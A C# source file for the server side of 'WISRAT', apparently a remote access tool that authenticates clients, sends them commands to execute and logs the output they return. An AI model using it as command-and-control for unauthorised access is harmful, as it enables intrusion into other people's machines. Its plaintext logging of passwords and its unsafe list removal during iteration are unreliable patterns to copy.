using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Serilog.Core;
using WISRAT.Shared;

namespace WISRAT.CLI
{
    /// <summary>
    /// WISRAT Server
    /// </summary>
    public class Server : IDisposable
    {
        /// <summary>
        /// Server port
        /// </summary>
        private int _port;
        
        /// <summary>
        /// Server port
        /// </summary>
        private IPAddress _ip;
        
        /// <summary>
        /// Server password
        /// </summary>
        private string _password;

        /// <summary>
        /// TcpListener instance
        /// </summary>
        private readonly TcpListener _listener;

        /// <summary>
        /// Do we use Serilog logger
        /// </summary>
        private readonly bool _useLogger = false;

        /// <summary>
        /// Serilog logger
        /// </summary>
        private readonly Logger _logger;

        /// <summary>
        /// Is server currently shutting down?
        /// </summary>
        private bool _isShuttingDown = false;

        /// <summary>
        /// List of Users
        /// </summary>
        public readonly List<User> Users = new List<User>();

        /// <summary>
        /// Makes an instance of Server
        /// </summary>
        /// <param name="ip">IP</param>
        /// <param name="port">Port</param>
        /// <param name="password">Password</param>
        public Server(IPAddress ip, int port, string password)
        {
            _ip = ip;
            _port = port;
            _password = password;
            _useLogger = false;
            _listener = new TcpListener(ip, port);
            _listener.Start();
            new Thread(ClientsThread).Start();
            new Thread(ReceiverThread).Start();
        }

        /// <summary>
        /// Makes an instance of Server with Serilog logger
        /// </summary>
        /// <param name="ip">IP</param>
        /// <param name="port">Port</param>
        /// <param name="password">Password</param>
        /// <param name="logger">Logger (optional)</param>
        public Server(IPAddress ip, int port, string password, Logger logger)
        {
            _ip = ip;
            _port = port;
            _password = password;
            _useLogger = true;
            _logger = logger;
            _listener = new TcpListener(ip, port);
            _listener.Start();
            new Thread(ClientsThread).Start();
            new Thread(ReceiverThread).Start();
        }

        /// <summary>
        /// Sends message to client
        /// </summary>
        public void SendMessage(string username, MessageBuilder.Message message)
        {
            var obj = Users.FirstOrDefault(x => x.Name == username);
            if (obj == null)
            {
                if (_useLogger) _logger.Error("[SendMessage] User is not online!");
                return;
            }
            NetworkSender sender = new NetworkSender(obj.Client.GetStream());
            sender.SendMessage(message);
        }

        /// <summary>
        /// Processes client messages
        /// </summary>
        private void ReceiverThread()
        {
            if (_useLogger) _logger.Information("[Receiver] Thread started!");
            while (true)
            {
                if (_isShuttingDown) return;
                try {
                    foreach (var i in Users)
                    {
                        if (!i.Client.Connected)
                        {
                            if (_useLogger) _logger.Information($"[Receiver] User disconnected: {i.Name}");
                            if (_useLogger) _logger.Warning($"[Receiver] ... without disconnection packet!");
                            i.Client.Dispose();
                            Users.Remove(i);
                            continue;
                        }

                        NetworkSender sender = new NetworkSender(i.Client.GetStream());
                        MessageBuilder.Message msg = sender.ReadMessage();

                        switch (msg.Type)
                        {
                            case MessageBuilder.MessageType.Disconnect:
                                if (_useLogger) _logger.Information($"[Receiver] User disconnected: {i.Name}");
                                i.Client.Dispose();
                                Users.Remove(i);
                                break;
                            case MessageBuilder.MessageType.CommandOutput:
                                if (_useLogger) _logger.Information($"[Receiver] Command output received:");
                                if (_useLogger) _logger.Information(Encoding.UTF8.GetString(msg.Content));
                                break;
                            case MessageBuilder.MessageType.ExecuteCommand:
                                if (_useLogger)
                                    _logger.Warning($"[Receiver] Unexpected packet ExecuteClient (from client)!");
                                break;
                            case MessageBuilder.MessageType.UserData:
                                if (_useLogger) _logger.Warning($"[Receiver] Unexpected packet UserData (after auth)!");
                                break;
                        }
                    }
                } catch {
                    // Ignored
                }
            }
        }

        /// <summary>
        /// Processes clients
        /// </summary>
        private void ClientsThread()
        {
            if (_useLogger) _logger.Information("[Clients] Thread started!");
            while (true)
            {
                TcpClient client = _listener.AcceptTcpClient();
                if (_isShuttingDown) return;
                string ip = ((IPEndPoint) client.Client.RemoteEndPoint)?.Address.ToString();
                if (string.IsNullOrEmpty(ip))
                {
                    if (_useLogger) _logger.Warning("[Clients] Unexpected: RemoteEndPoint is null");
                    client.Dispose();
                    continue;
                }
                if (_useLogger) _logger.Information($"[Clients] Early connection of {ip}");
                if (BanList.Contains("ipbanlist.txt", ip))
                {
                    if (_useLogger) _logger.Warning($"[Clients] {ip} rejected: Banned IP!");
                    client.Dispose();
                    continue;
                }
                NetworkSender sender = new NetworkSender(client.GetStream());
                MessageBuilder.Message login = sender.ReadMessage();
                string loginData = Encoding.UTF8.GetString(login.Content);
                string name = loginData.Split('|')[0];
                string password = loginData.Split('|')[1];
                if (_useLogger) _logger.Information($"[Clients] {ip} sent auth data: {name}:{password}");
                if (password != _password)
                {
                    if (_useLogger) _logger.Warning($"[Clients] {name} rejected: Invalid password!");
                    client.Dispose();
                    continue;
                }

                if (BanList.Contains("banlist.txt", name))
                {
                    if (_useLogger) _logger.Warning($"[Clients] {name} rejected: Banned username!");
                    client.Dispose();
                    continue;
                }
                
                Users.Add(new User { Client = client, Name = name, Password = password, IP = ip });
                if (_useLogger) _logger.Information($"[Clients] {name} accepted!");
            }
        }

        /// <summary>
        /// Disposes TcpListener and stops all threads
        /// </summary>
        public void Dispose()
        {
            if (_useLogger) _logger.Information("Disposing server...");
            _isShuttingDown = true;
            _listener.Stop();
            if (_useLogger) _logger.Information("Done!");
        }
    }
}